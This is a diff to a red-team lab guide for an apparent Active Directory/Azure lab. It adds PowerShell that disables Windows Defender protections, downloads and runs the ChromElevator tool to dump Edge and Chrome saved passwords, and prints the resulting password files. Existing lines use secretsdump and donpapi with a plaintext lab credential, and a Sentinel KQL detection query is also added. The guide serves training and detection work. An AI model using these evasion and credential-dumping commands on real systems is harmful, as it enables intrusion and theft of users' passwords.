@@ -612,14 +612,7 @@ mkdir /opt/hashes
 secretsdump.py doazlab/doadmin:'DOLabAdmin1!'@192.168.2.5 |tee -a /opt/hashes/secrets-output.txt
 ```
 
-You will be prompted for a password. 
-
-
-| &#x1F427; Bash Input | Linux Host: Nux01 |
-|----------------------|-------------------|
-```bash
-DOLabAdmin1!
-```
+The results are shown next. 
 
 | ![Secretsdump](img/secretsdump1.jpg) |
 |------------------------------------------------|
@@ -786,7 +779,24 @@ python3 regsecrets.py -k -no-pass -dc-ip 192.168.2.4 doazlab.com/doadmin@ws05.do
 
 </summary><blockquote>
 
-On the workstation, WS05, open all three installed browsers and paste the site link below into each browser's address bar. 
+On the workstation, WS05, turn off AV. We ain't got time. Run the following commands. 
+
+```PowerShell
+New-Item -ItemType Directory -Path "C:\DOAZLab" -Force > $null
+Set-MpPreference -ExclusionPath 'c:\users\doadmin'
+Set-MpPreference -ExclusionPath 'c:\DOAZLab'
+Set-MpPreference -ExclusionProcess "powershell.exe", "cmd.exe"
+Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -EnableControlledFolderAccess Disabled
+Set-MpPreference -EnableNetworkProtection AuditMode
+Set-MpPreference -Force -MAPSReporting Disabled
+Set-MpPreference -SubmitSamplesConsent NeverSend
+
+```
+
+Next, open all three installed browsers and paste the site link below into each browser's address bar. 
 
 | &#x1f30e; URL | Browsers on Workstation WS05 |
 |---------------|----------------------------------|
@@ -880,14 +890,62 @@ donpapi collect -u doadmin -p 'DOLabAdmin1!' -t 192.168.2.5 --domain doazlab.com
 | ![Edge Save Password Got It](img/browser-cred-extract.jpg) |
 |------------------------------------------------|
 
+Okay, so in all likelihood, the browser passwords **were not extracted.** Herein lies another problem pentesters deal with all the time - encryption standards change in Chrome and that rolls down to Edge, and our tools stop working. But, where there's a will, there's usually a way. 
 
+Let's check out ChromElevator and see if we can get some passwords another way. 
+
+```PowerShell
+iwr https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.16.1/chrome-injector-v0.16.1.zip -OutFile C:\users\doadmin\Downloads\chrome-injector.zip
+cd C:\users\doadmin\Downloads\
+expand-archive .\chrome-injector.zip -Force
+```
+
+| ![Injector Dir Structure](img/expand-injector.jpg) |
+|------------------------------------------------|
+
+Run it against Edge first!
+
+```PowerShell
+cd chrome-injector
+.\chromelevator_x64.exe edge
+```
+
+| ![Injector Dir Structure](img/edge-dump.jpg) |
+|------------------------------------------------|
+
+Run it against Chrome too.
+
+```PowerShell
+.\chromelevator_x64.exe chrome
+```
+
+| ![Injector Dir Structure](img/chrome-dump.jpg) |
+|------------------------------------------------|
+
+The following commands will show the passwords. 
+
+```PowerShell
+type C:\users\doadmin\Downloads\chrome-injector\output\Edge\Default\passwords.json
+type C:\users\doadmin\Downloads\chrome-injector\output\Chrome\Default\passwords.json
+
+```
+
+Got Sentinel detect? Check out the Azure portal, search for Sentinel, click on Logs, and drop the following KQL.
+
+```KQL
+SecurityEvent
+| where EventID == 5145
+| where EventData contains "Login Data"
+```
+
+| ![KQL Login Data Theft](img/kql-login-data-theft.jpg) |
+|------------------------------------------------|
 
 Open a browser and search `stealer logs 101`.
 
 An interesting link: https://www.zerofox.com/blog/an-introduction-to-stealer-logs/
 
 </blockquote></details>
-
 
 
 
